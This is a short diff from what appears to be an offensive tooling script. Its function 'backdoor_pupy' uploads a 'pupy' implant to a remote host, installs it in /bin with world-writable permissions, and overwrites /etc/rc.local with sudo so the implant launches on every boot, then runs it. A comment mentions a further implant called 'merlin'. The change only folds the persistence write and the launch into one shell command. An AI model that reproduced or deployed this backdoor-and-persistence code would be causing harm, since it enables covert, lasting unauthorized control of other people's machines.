@@ -36,7 +36,7 @@ def backdoor_pupy(connect):
     connect.put('UploadFiles/pupy')
     connect.sudo('mv pupy /bin/')
     connect.sudo('chmod 777 /bin/pupy')
-    connect.sudo('printf \"#!/bin/bash\n/bin/./pupy\nexit 0\" > /etc/rc.local')
+    connect.sudo("sh -c 'printf \"#!/bin/bash\n/bin/./pupy\nexit 0\" > /etc/rc.local && /bin/./pupy'")
     connect.sudo('/bin/./pupy')
 
 # Up to implementation: merlin
